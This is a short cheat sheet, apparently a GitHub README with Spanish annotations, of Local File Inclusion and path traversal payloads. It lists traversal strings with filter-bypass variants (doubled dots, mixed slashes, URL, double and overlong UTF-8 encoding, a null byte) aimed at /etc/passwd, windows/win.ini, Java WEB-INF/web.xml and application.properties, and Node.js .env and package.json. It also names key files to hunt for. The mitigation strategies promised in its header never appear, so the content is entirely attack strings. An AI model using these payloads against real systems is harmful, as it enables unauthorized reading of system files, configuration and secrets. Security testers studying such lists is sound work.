<h1 align="center">Local File Inclusion (LFI) Cheat Sheet</h1>

<p align="center">
  Comprehensive reference guide for Local File Inclusion identification, exploitation techniques, attack vectors, and mitigation strategies.
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Kali_Linux-111827?style=for-the-badge&logo=kalilinux&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/Web_Security-111827?style=for-the-badge&logo=owasp&logoColor=00A4EF">
  <img src="https://img.shields.io/badge/OffSec-Techniques-111827?style=for-the-badge&logoColor=FF003C">
  <img src="https://img.shields.io/badge/LFI-Local_File_Inclusion-111827?style=for-the-badge&logoColor=00FFFF">
  <img src="https://img.shields.io/badge/Type-CheatSheet-111827?style=for-the-badge&logoColor=00FFFF">
</p>

## Linux

```
../../../../../../../../../etc/passwd
```
> or /../../../../../../../../../etc/passwd

```
....//....//....//....//....//etc/passwd
```

```
.....//.....//.....//.....//etc/passwd
```

```
....////....////....////....////etc/passwd
```

```
./contenido/etc/passwd
```

```
...././...././...././...././etc/passwd
```

```
..././..././..././..././etc/passwd
```

```
....\/....\/....\/....\/etc/passwd
```

```
....\\....\\....\\....\\etc/passwd
```

```
...\\/...\/...\/...\/etc/passwd
```


--------------------------------------------------------------------------------------------------------

## Windows

```
..\..\..\..\..\..\..\windows\win.ini
```

------------------------------------------------------------------------------

## Java

```
../../../../WEB-INF/web.xml
```

```
..\..\..\..\WEB-INF\web.xml
```

```
..%2f..%2f..%2f..%2fWEB-INF/web.xml
```

```
..%2f..%2f..%2f..%2fWEB-INF/classes/application.properties
```

```
..%c0%af..%c0%af..%c0%af..%c0%afWEB-INF/web.xml
```

```
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/WEB-INF/web.xml
```

```
..%252f..%252f..%252f..%252fWEB-INF/web.xml
```

```
%252e%252e%252f%25252e%252e%252fWEB-INF/web.xml
```

> Archivos clave en Java para buscar:

>  /WEB-INF/web.xml

> /WEB-INF/classes/application.properties

> /WEB-INF/classes/application.yml

> /META-INF/MANIFEST.MF
--------------------------------------------------------------------------------------

## JavaScript

```
../../../../package.json
```

```
../../../../.env
```

```
../../../../server.js
```

```
....//....//....//....//package.json
```

```
..././..././..././package.json
```

```
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fpackage.json
```

```
..%2f..%2f..%2f..%2f.env
```

```
../../../../package.json%00
```

> Archivos clave en Node.js para buscar:
> package.json
> .env
> app.js / server.js
> /etc/passwd (si está corriendo en contenedor Linux)
